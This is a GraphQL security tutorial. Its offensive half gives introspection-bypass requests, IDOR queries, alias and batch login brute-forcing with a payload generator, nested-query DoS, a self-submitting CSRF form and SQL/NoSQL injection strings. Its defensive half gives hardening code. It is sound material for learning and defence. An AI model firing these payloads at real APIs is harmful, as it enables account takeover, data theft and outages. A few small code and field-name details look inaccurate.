# GraphQL API Security

GraphQL's fundamental design — a single endpoint accepting freeform queries that can traverse complex object graphs — makes it a high-value attack target that bypasses many REST-era security assumptions. Unlike REST APIs where each resource has a fixed shape and URL, GraphQL lets clients define exactly what data they receive, which means a single misconfigured resolver or overly permissive schema can expose entire object hierarchies to an attacker. Introspection, batching, and aliases are all legitimate GraphQL features that become exploitation primitives in the wrong hands.

**Fundamental principle: GraphQL's flexibility is inseparable from its risk — the same query language features that make it powerful for clients make it a self-documenting attack surface that can bypass rate limiting, leak schema structure, and chain IDOR vulnerabilities across an entire data graph in a single HTTP request.**

***

## How GraphQL Works

Before attacking, you need to understand the protocol. GraphQL operates differently from REST in ways that directly shape the attack surface.

```
REST vs GraphQL — structural comparison:
──────────────────────────────────────────────────────────────────────────
  REST                                  GraphQL
  ─────────────────────────────         ──────────────────────────────────
  Multiple endpoints                    Single endpoint (/graphql)
  GET /users/1                          POST /graphql  { query: "{ user(id:1) { name } }" }
  GET /products/3                       POST /graphql  { query: "{ product(id:3) { price } }" }
  POST /orders                          POST /graphql  { mutation { createOrder(...) { id } } }

  HTTP method defines operation         Operation TYPE defines action (query/mutation/subscription)
  Server defines response shape         CLIENT defines response shape
  Rate limiting per endpoint            Rate limiting per endpoint → bypassable with aliases
  Separate auth per endpoint            Single endpoint → auth must be per resolver

GraphQL execution flow:
─────────────────────────────────────────────────────────────────────────
  Client                    GraphQL Server                  Data Sources
     │                            │                              │
     │──[POST /graphql]──────────►│                              │
     │  { query, variables,       │                              │
     │    operationName }         │                              │
     │                      [Parse query]                        │
     │                      [Validate against schema]            │
     │                      [Execute resolvers]──────────────────►
     │                            │                    DB / REST / cache
     │                            │◄──────────────────────────────
     │◄──[JSON response]──────────│                              │
     │  { "data": {...},          │                              │
     │    "errors": [...] }       │                              │
```

### The Schema

```graphql
# ── Full example schema illustrating all key type constructs ─────────────────

# Scalar types: Int, Float, String, Boolean, ID
# ! = non-nullable (required field)

type Product {
    id:          ID!          # non-nullable — always returned
    name:        String!
    description: String
    price:       Int
    listed:      Boolean!
    owner:       User         # nested object type → traversable
}

type User {
    id:          ID!
    username:    String!
    email:       String!      # ← sensitive — should access control this
    password:    String       # ← SHOULD NOT exist in queryable schema
    orders:      [Order!]!    # list of non-nullable Order objects
    isAdmin:     Boolean!
}

type Order {
    id:          ID!
    product:     Product!
    quantity:    Int!
    user:        User!        # ← circular reference — enables deep nesting DoS
}

# Root types — entry points for each operation class
type Query {
    getProduct(id: ID!): Product
    getProducts: [Product!]!
    getUser(id: ID!): User          # ← IDOR risk if no auth check
    getEmployees: [User!]!
}

type Mutation {
    createProduct(name: String!, listed: Boolean!): Product
    deleteUser(id: ID!): Boolean    # ← destructive — needs strict auth
    updateEmail(id: ID!, email: String!): User
}

type Subscription {
    onOrderCreated: Order           # ← usually WebSocket-based
}
```

### Operation Types

```graphql
# ── QUERIES: fetch data (read-only) ──────────────────────────────────────────

# Simple query — single object by argument
query getProductById {
    getProduct(id: 123) {
        name
        description
        price
    }
}

# Query with nested object traversal
query getEmployeesWithOrders {
    getEmployees {
        id
        username
        orders {               # ← nested type traversal
            id
            product {
                name
                price
            }
        }
    }
}

# ── MUTATIONS: modify data (create / update / delete) ────────────────────────

mutation createNewProduct {
    createProduct(name: "Flamin' Cocktail Glasses", listed: true) {
        id
        name
        listed
    }
}

# Response mirrors requested fields:
# {
#   "data": {
#     "createProduct": {
#       "id": "456",
#       "name": "Flamin' Cocktail Glasses",
#       "listed": true
#     }
#   }
# }

# ── VARIABLES: pass dynamic args from separate JSON dict ─────────────────────

# Declare variable type in operation signature, use in body
query getEmployeeWithVariable($id: ID!) {
    getEmployees(id: $id) {
        username
        email
    }
}
# Variables dict (separate JSON field):
# { "id": "1" }

# ── ALIASES: return multiple same-type objects in one request ─────────────────

query getMultipleProducts {
    product1: getProduct(id: "1") { id name price }
    product2: getProduct(id: "2") { id name price }
    product3: getProduct(id: "3") { id name price }  # ← id 3 may be hidden/delisted
}

# ── FRAGMENTS: reusable field selections ──────────────────────────────────────

fragment userDetails on User {
    id
    username
    email
    isAdmin
}

query getAllUsers {
    getEmployees {
        ...userDetails    # ← spread fragment
        orders { id }
    }
}

# ── SUBSCRIPTIONS: persistent push connection ─────────────────────────────────

subscription watchOrders {
    onOrderCreated {
        id
        product { name }
        quantity
    }
}
# Typically upgrades to WebSocket → different attack surface (no CSRF token,
# persistent auth session, harder to rate-limit)
```

***

## Reconnaissance: Finding the Endpoint

All GraphQL traffic flows through a single endpoint. Locating it is the first step.

```
# ── STEP 1: Probe common endpoint suffixes ────────────────────────────────────

Target: https://target.com

Paths to try:
  /graphql
  /api
  /api/graphql
  /graphql/api
  /graphql/graphql
  /v1/graphql
  /graphql/v1
  /query
  /gql

Technique: send a universal query to each path
  → If the path is a GraphQL endpoint, it will always respond with __typename

# ── STEP 2: Universal query ───────────────────────────────────────────────────

# POST (standard)
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json

{"query":"{__typename}"}

# Expected response if GraphQL:
# {"data":{"__typename":"query"}}

# Expected response if not GraphQL:
# 404 Not Found / HTML error page

# ── STEP 3: Try alternative HTTP methods ──────────────────────────────────────

# Some endpoints accept GET (also needed for CSRF exploitation later)
GET /graphql?query={__typename} HTTP/1.1
Host: target.com

# URL-encoded POST (bypasses JSON-only restrictions)
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

query=%7B__typename%7D

# ── STEP 4: Look for error signatures ─────────────────────────────────────────

# Non-GraphQL requests to a GraphQL endpoint often return:
#   {"errors":[{"message":"Must provide query string."}]}
#   {"errors":[{"message":"Query not present"}]}
#   {"errors":[{"message":"400: Bad Request"}]}
# → These error messages strongly indicate a GraphQL endpoint even before
#   a valid query is sent
```

***

## Introspection: Schema Discovery

Introspection is GraphQL's built-in self-documentation system. When left enabled in production, it hands an attacker a complete map of the API.

### Probing for Introspection

```
# ── STEP 1: Basic introspection probe ────────────────────────────────────────

POST /graphql HTTP/1.1
Content-Type: application/json

{"query":"{__schema{queryType{name}}}"}

# If enabled — response contains queryType name:
# {"data":{"__schema":{"queryType":{"name":"Query"}}}}

# If disabled — response contains error:
# {"errors":[{"message":"GraphQL introspection is not allowed..."}]}
```

### Full Introspection Query

```graphql
# ── FULL SCHEMA DUMP — run this to map every type, field, mutation ────────────

query IntrospectionQuery {
    __schema {
        queryType      { name }
        mutationType   { name }
        subscriptionType { name }

        types {
            ...FullType
        }

        directives {
            name
            description
            args { ...InputValue }
        }
    }
}

fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
        name
        description
        args         { ...InputValue }
        type         { ...TypeRef }
        isDeprecated
        depreciationReason
    }
    inputFields  { ...InputValue }
    interfaces   { ...TypeRef }
    enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        depreciationReason
    }
    possibleTypes { ...TypeRef }
}

fragment InputValue on __InputValue {
    name
    description
    type         { ...TypeRef }
    defaultValue
}

fragment TypeRef on __Type {
    kind
    name
    ofType {
        kind
        name
        ofType {
            kind
            name
            ofType { kind name }
        }
    }
}

# NOTE: Some servers reject onOperation/onFragment/onField directives.
# If the query fails, remove those three lines from the directives block.
```

### What to Look for in Introspection Output

```json
// ── Example introspection result — annotated attack intel ─────────────────

{
  "data": {
    "__schema": {
      "queryType": { "name": "Query" },
      "mutationType": { "name": "Mutation" },
      "types": [
        {
          "name": "User",
          "fields": [
            { "name": "id" },
            { "name": "username" },
            { "name": "email" },
            { "name": "password" },       // ← HIGH VALUE: password in schema
            { "name": "isAdmin" },        // ← privilege info visible
            { "name": "resetToken" }      // ← password reset token exposed
          ]
        },
        {
          "name": "Query",
          "fields": [
            { "name": "getUser",        // ← potential IDOR target
              "args": [{ "name": "id", "type": { "name": "ID" } }] },
            { "name": "getUsers" },     // ← enumerate all users
            { "name": "getProduct" }
          ]
        },
        {
          "name": "Mutation",
          "fields": [
            { "name": "deleteUser" },   // ← destructive operation
            { "name": "updateEmail" },  // ← account takeover vector
            { "name": "changePassword"},// ← account takeover vector
            { "name": "createAdmin" }   // ← privilege escalation
          ]
        }
      ]
    }
  }
}

// Attacker workflow after receiving this:
// 1. Map all types with sensitive fields (password, token, isAdmin, email)
// 2. Identify mutations that can modify auth state
// 3. Identify queries that accept ID arguments → test for IDOR
// 4. Note any deprecated fields → often have weaker auth than current fields
```

### Bypassing Introspection Defences

```
# ── BYPASS 1: Newline injection (breaks naive regex filter on __schema{) ─────

POST /graphql HTTP/1.1
Content-Type: application/json

{"query":"query{__schema\n{queryType{name}}}"}
#                      ↑
#                      Newline character — regex matching __schema{ won't match
#                      but GraphQL parser ignores whitespace

# ── BYPASS 2: Inline fragment with __schema ────────────────────────────────

{"query":"{__schema { types { name } } }"}
# → space between __schema and { bypasses filters looking for __schema{


# ── BYPASS 3: Change HTTP method ─────────────────────────────────────────────

# If introspection is only blocked on POST, try GET:
GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D HTTP/1.1
# URL decoded: query{__schema\n{queryType{name}}}

# Or POST with form-urlencoded content type:
POST /graphql HTTP/1.1
Content-Type: application/x-www-form-urlencoded

query=%7B__schema%7BqueryType%7Bname%7D%7D%7D


# ── BYPASS 4: Suggestions-based schema reconstruction (no introspection) ──────

# Apollo returns field name hints when you misspell a field:
#   "Did you mean 'username'?" → 'usr' is not a field but 'username' is

# Manual probing:
query { getUser(id:1) { usr } }
# Response: "Cannot query field 'usr' on type 'User'. Did you mean 'username'?"
# → 'username' confirmed as valid field

query { getUser(id:1) { passwrd } }
# Response: "Did you mean 'password'?"
# → 'password' field confirmed without introspection

# Automated: Clairvoyance tool uses this to reconstruct full schema via
# dictionary-based brute forcing of field names against suggestion responses.
```

***

## Exploitation: IDOR via Unsanitised Arguments

When GraphQL resolvers do not validate authorisation, arguments become a direct path to other users' data.

```graphql
# ── SCENARIO: Product listing with hidden items ───────────────────────────────
#
# Normal product list query (server returns only listed=true products)
query {
    getProducts {
        id
        name
        listed
    }
}

# Response: ids 1, 2, 4 returned — id 3 is missing
# → Product 3 likely exists but is delisted / secret

# Attacker directly queries the missing ID
query {
    getProduct(id: 3) {
        id
        name
        description
        price
        listed        # → "no" — confirms it's a hidden product
    }
}


# ── SCENARIO: Accessing other users' private data ────────────────────────────

# Attacker is logged in as user id=5
# They query another user's details directly:
query {
    getUser(id: 1) {       # ← id 1 = admin user
        id
        username
        email
        password           # ← exposed field in schema
        isAdmin
        resetToken         # ← active password reset token
    }
}

# If resolver has no authorisation check:
# {
#   "data": {
#     "getUser": {
#       "id": "1",
#       "username": "administrator",
#       "email": "admin@target.com",
#       "password": "hunter2",
#       "isAdmin": true,
#       "resetToken": "abc123xyz"
#     }
#   }
# }
# → Full admin account compromise


# ── SCENARIO: Using node/nodes fields for direct object access ────────────────
# Some GraphQL implementations expose generic node(id: ID!) fields that
# accept global IDs and return any object type, bypassing type-specific
# resolvers that might have auth checks.

query {
    node(id: "VXNlcjox") {   # ← base64 of "User:1"
        ... on User {
            id
            username
            email
            password
        }
    }
}
```

***

## Exploitation: Bypassing Rate Limiting via Aliases

Aliases allow multiple instances of the same operation in a single HTTP request. Because most rate limiters count HTTP requests rather than operations within a request, aliases bypass them entirely.

```graphql
# ── ATTACK: Brute force login via aliased mutations ───────────────────────────
#
# Rate limiter sees 1 HTTP request
# Server executes 100 login attempts in that 1 request
#
# Single HTTP POST /graphql:

mutation {
    login1:  login(input: { username: "carlos", password: "123456"   }) { token success }
    login2:  login(input: { username: "carlos", password: "password" }) { token success }
    login3:  login(input: { username: "carlos", password: "letmein"  }) { token success }
    login4:  login(input: { username: "carlos", password: "qwerty"   }) { token success }
    login5:  login(input: { username: "carlos", password: "monkey"   }) { token success }
    login6:  login(input: { username: "carlos", password: "dragon"   }) { token success }
    login7:  login(input: { username: "carlos", password: "master"   }) { token success }
    login8:  login(input: { username: "carlos", password: "sunshine" }) { token success }
    # ... continue for full password list
    login100: login(input: { username: "carlos", password: "abc123"  }) { token success }
}

# Response — search for "success":true to find the valid credential:
# {
#   "data": {
#     "login1":  { "token": null,    "success": false },
#     "login2":  { "token": null,    "success": false },
#     ...
#     "login8":  { "token": "eyJhbG...", "success": true },   ← found it
#     ...
#   }
# }


# ── ATTACK: OTP / discount code enumeration via aliases ───────────────────────

query isValidDiscount {
    code001: isValidDiscount(code: 1000) { valid }
    code002: isValidDiscount(code: 1001) { valid }
    code003: isValidDiscount(code: 1002) { valid }
    # ... 1000 codes in one HTTP request
}


# ── GENERATING ALIASED PAYLOADS: Python helper ───────────────────────────────

passwords = ["123456", "password", "letmein", "qwerty", "monkey", "dragon"]
username = "carlos"

lines = []
for i, pwd in enumerate(passwords, 1):
    lines.append(
        f'  login{i}: login(input: {{ username: "{username}", password: "{pwd}" }}) '
        f'{{ token success }}'
    )

mutation = "mutation {\n" + "\n".join(lines) + "\n}"
print(mutation)
```

***

## Exploitation: Batching Attacks (Array Syntax)

JSON array batching is a separate mechanism from aliases — it sends multiple complete query objects in one array.

```
# ── ARRAY-BASED BATCHING ──────────────────────────────────────────────────────
#
# Standard GraphQL spec: single object per request
# {"query":"...","variables":{}}
#
# Batch extension: array of query objects
#
POST /graphql HTTP/1.1
Content-Type: application/json

[
  {"query": "mutation { login(input: { username: \"carlos\", password: \"123456\" }) { token success } }"},
  {"query": "mutation { login(input: { username: \"carlos\", password: \"password\" }) { token success } }"},
  {"query": "mutation { login(input: { username: \"carlos\", password: \"letmein\" }) { token success } }"}
]

# Server returns an array of responses:
# [
#   {"data": {"login": {"token": null, "success": false}}},
#   {"data": {"login": {"token": null, "success": false}}},
#   {"data": {"login": {"token": "eyJhbG...", "success": true}}}
# ]

# ← Same WAF/rate-limit bypass as aliases, different wire format
# ← Some servers support batching, some don't — worth probing both


# ── BATCHING FOR ENUMERATION ──────────────────────────────────────────────────

# Enumerate every user ID in ~10 requests instead of 10,000:
POST /graphql HTTP/1.1
Content-Type: application/json

[
  {"query": "{ getUser(id: 1) { id username email } }"},
  {"query": "{ getUser(id: 2) { id username email } }"},
  {"query": "{ getUser(id: 3) { id username email } }"},
  {"query": "{ getUser(id: 4) { id username email } }"}
]
```

***

## Exploitation: Denial of Service via Deeply Nested Queries

GraphQL allows clients to traverse circular object references infinitely. Without depth or cost limits, a single malicious query can exhaust server memory and CPU.

```graphql
# ── DEEPLY NESTED QUERY DoS (circular type reference) ────────────────────────
#
# Schema has: Order → Product → ... and User → Orders → User → Orders → ...
# A naive implementation has no depth limit

query evil {                     # depth: 0
    getUser(id: 1) {             # depth: 1
        orders {                 # depth: 2
            product {            # depth: 3
                owner {          # depth: 4   (User type again → circular)
                    orders {     # depth: 5
                        product {# depth: 6
                            owner {           # depth: 7
                                orders {      # depth: 8
                                    product { # depth: 9
                                        name  # depth: 10
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}

# At depth N, the server makes exponentially more resolver calls.
# Depth 10+ with circular references → OOM / process kill.


# ── AMOUNT ABUSE ──────────────────────────────────────────────────────────────

query expensiveAmount {
    getUser(id: 1) {
        orders(first: 99999999) {    # ← request 100M order objects
            product {
                name
                owner {
                    orders(first: 99999999) { id }
                }
            }
        }
    }
}

# Without pagination enforcement → DB query returns unbounded rows
# → memory exhaustion → DoS
```

***

## Exploitation: GraphQL CSRF

GraphQL endpoints that accept non-JSON content types are vulnerable to CSRF because browsers can natively submit `application/x-www-form-urlencoded` and `text/plain` cross-origin, bypassing the same-origin policy.

```html
<!-- ── ATTACK: CSRF via form-urlencoded GraphQL mutation ──────────────────────
     Victim visits attacker-controlled page.
     Their browser submits a mutation to the vulnerable GraphQL endpoint.
     No CSRF token → mutation executes as victim. -->

<html>
<body>
  <form id="csrf" action="https://target.com/graphql" method="POST">
    <input type="hidden" name="query" value="
      mutation {
        updateEmail(id: 5, email: &quot;attacker@evil.com&quot;) {
          id
          email
        }
      }
    "/>
  </form>
  <script>document.getElementById('csrf').submit();</script>
</body>
</html>

<!-- ── Why this works ──────────────────────────────────────────────────────────
     POST with application/x-www-form-urlencoded is a "simple request"
     → no CORS preflight → browser sends it cross-origin with cookies
     → if endpoint accepts this content type without CSRF token → exploitable

     POST with application/json requires CORS preflight
     → cannot be forged from another origin without CORS misconfiguration
     → JSON-only endpoints are safe from this specific attack ✓             -->
```

***

## Exploitation: Injection via GraphQL Arguments

GraphQL arguments flow directly into resolver logic — SQL queries, NoSQL operations, LDAP queries, OS commands — wherever the resolver sends them.

```javascript
// ── SCENARIO: SQL injection through a GraphQL resolver (Node.js) ─────────────

// ✗ VULNERABLE resolver — argument concatenated into raw SQL
const resolvers = {
    Query: {
        getUser: (_, { username }) => {
            // username comes from the GraphQL argument — attacker-controlled
            const query = `SELECT * FROM users WHERE username = '${username}'`;
            //                                                  ↑ injection point
            return db.query(query);
        }
    }
};

// Attacker sends:
// query { getUser(username: "admin'--") { id email password } }
// → SQL executed: SELECT * FROM users WHERE username = 'admin'--'
// → bypasses any password check / returns admin row

// Union-based data extraction:
// query { getUser(username: "' UNION SELECT username,password,null FROM users--") { id } }

// ── SCENARIO: NoSQL injection (MongoDB) ──────────────────────────────────────

// ✗ VULNERABLE
const getUser = async (_, { username }) => {
    return await db.collection('users').findOne({ username: username });
    // If username is passed as an object rather than string:
    // { username: { $gt: "" } } → returns first document (auth bypass)
};

// GraphQL input (variables dict):
// { "username": { "$gt": "" } }   ← operator injection if type not enforced
```

***

## Defences: Secure Configuration and Code

### Disabling Introspection

```javascript
// ── JavaScript / Apollo Server ────────────────────────────────────────────────

const { ApolloServer } = require('apollo-server');
const { NoIntrospection } = require('graphql');

const server = new ApolloServer({
    typeDefs,
    resolvers,
    // ✓ Disable introspection in production using validation rule
    validationRules: process.env.NODE_ENV === 'production'
        ? [NoIntrospection]
        : [],
    // ✓ Disable GraphiQL IDE in production
    introspection: process.env.NODE_ENV !== 'production',
    // ✓ Suppress stack traces in production
    debug: process.env.NODE_ENV !== 'production',
    // ✓ Mask internal errors from responses
    formatError: (err) => {
        if (process.env.NODE_ENV === 'production') {
            return new Error('Internal server error');  // ← mask details
        }
        return err;
    }
});
```

```java
// ── Java / graphql-java ───────────────────────────────────────────────────────

import graphql.schema.visibility.NoIntrospectionGraphqlFieldVisibility;

GraphQLSchema schema = GraphQLSchema.newSchema()
    .query(queryType)
    // ✓ Disable introspection field visibility
    .fieldVisibility(NoIntrospectionGraphqlFieldVisibility.NO_INTROSPECTION_FIELD_VISIBILITY)
    .build();
```

### Depth and Complexity Limiting

```javascript
// ── Query depth limiting (JavaScript) ────────────────────────────────────────

const depthLimit = require('graphql-depth-limit');
const { createComplexityLimitRule } = require('graphql-validation-complexity');

const server = new ApolloServer({
    typeDefs,
    resolvers,
    validationRules: [
        // ✓ Reject queries nested deeper than 5 levels
        depthLimit(5, { ignore: [] }, (depths) => {
            console.log('Query depth:', depths);
        }),

        // ✓ Reject queries exceeding cost threshold
        // Each field costs 1; lists multiply cost by 10
        createComplexityLimitRule(1000, {
            onCost: (cost) => console.log('Query cost:', cost),
            formatErrorMessage: (cost) =>
                `Query exceeds complexity limit (cost: ${cost})`,
        }),
    ],
});


// ── Manual depth check implementation ────────────────────────────────────────

function getQueryDepth(selectionSet, depth = 0) {
    if (!selectionSet) return depth;
    return Math.max(
        ...selectionSet.selections.map(selection =>
            getQueryDepth(selection.selectionSet, depth + 1)
        )
    );
}

const MAX_DEPTH = 5;

// In middleware / validation rule:
if (getQueryDepth(parsedQuery.selectionSet) > MAX_DEPTH) {
    throw new Error(`Query depth exceeds maximum allowed (${MAX_DEPTH})`);
}
```

```java
// ── Java depth and complexity limiting ────────────────────────────────────────

import graphql.analysis.MaxQueryDepthInstrumentation;
import graphql.analysis.MaxQueryComplexityInstrumentation;

GraphQL graphQL = GraphQL.newGraphQL(schema)
    // ✓ Reject queries deeper than 5 levels
    .instrumentation(new MaxQueryDepthInstrumentation(5))
    // ✓ Reject queries with field complexity > 200
    .instrumentation(new MaxQueryComplexityInstrumentation(200))
    .build();
```

### Resolver-Level Access Control

```javascript
// ── ✗ VULNERABLE: No authorisation check on getUser resolver ─────────────────

const resolvers = {
    Query: {
        getUser: async (_, { id }) => {
            return await User.findById(id);   // any caller gets any user
        }
    }
};


// ── ✓ SECURE: Enforce authorisation per resolver ─────────────────────────────

const resolvers = {
    Query: {
        getUser: async (_, { id }, context) => {
            // context.user is set by auth middleware on every request
            if (!context.user) {
                throw new AuthenticationError('Not authenticated');
            }

            // Users can only fetch their own record; admins can fetch any
            if (context.user.id !== id && !context.user.isAdmin) {
                throw new ForbiddenError('Not authorised to access this user');
            }

            return await User.findById(id);
        }
    },

    Mutation: {
        deleteUser: async (_, { id }, context) => {
            // ✓ Require admin role for destructive operations
            if (!context.user?.isAdmin) {
                throw new ForbiddenError('Admin role required');
            }

            // ✓ Audit log every destructive mutation
            await AuditLog.create({
                action: 'DELETE_USER',
                targetId: id,
                actorId: context.user.id,
                timestamp: new Date()
            });

            return await User.deleteById(id);
        }
    }
};


// ── ✓ SECURE: Parameterised SQL in resolvers ──────────────────────────────────

const resolvers = {
    Query: {
        getUser: async (_, { username }) => {
            // ✓ Parameterised query — username cannot break out of the literal
            const result = await db.query(
                'SELECT * FROM users WHERE username = $1',
                [username]      // ← bound parameter, never interpolated
            );
            return result.rows[0];
        }
    }
};
```

### Input Validation

```javascript
// ── Custom scalar type for validated input ────────────────────────────────────

const { GraphQLScalarType, GraphQLError } = require('graphql');

// ✓ Custom Email scalar — validates format before resolver receives value
const EmailScalar = new GraphQLScalarType({
    name: 'Email',
    description: 'Validated email address',
    serialize: (value) => value,
    parseValue: (value) => {
        const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
        if (!emailRegex.test(value)) {
            throw new GraphQLError(`Invalid email: ${value}`);
        }
        return value;
    },
    parseLiteral: (ast) => {
        const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
        if (!emailRegex.test(ast.value)) {
            throw new GraphQLError(`Invalid email: ${ast.value}`);
        }
        return ast.value;
    }
});

// Use in schema:
// type Mutation {
//     updateEmail(id: ID!, email: Email!): User   ← Email scalar enforces format
// }
```

### Preventing CSRF over GraphQL

```javascript
// ── Enforce JSON-only to prevent form-based CSRF ──────────────────────────────

const express = require('express');
const app = express();

app.use('/graphql', (req, res, next) => {
    const contentType = req.headers['content-type'] || '';

    // ✓ Only accept application/json — blocks form-urlencoded CSRF forgery
    if (req.method === 'POST' && !contentType.includes('application/json')) {
        return res.status(415).json({
            errors: [{ message: 'Unsupported Media Type — use application/json' }]
        });
    }

    // ✓ Block GET-based mutations (GET should only be used for queries if at all)
    if (req.method === 'GET' && req.query.query?.trim().startsWith('mutation')) {
        return res.status(405).json({
            errors: [{ message: 'Mutations not allowed over GET' }]
        });
    }

    next();
});

// ── Alias limiting to prevent brute-force via aliases ────────────────────────

const GraphQLArmor = require('@escape.tech/graphql-armor');

// GraphQL Armor middleware — configure alias limits
GraphQLArmor.protect(server, {
    maxAliases: {
        enabled: true,
        n: 15,                      // ← maximum 15 aliases per query
        propagateOnRejection: true,
    },
    maxDirectives: { enabled: true, n: 10 },
    maxDepth:      { enabled: true, n: 6  },
    maxTokens:     { enabled: true, n: 1000 },
});
```
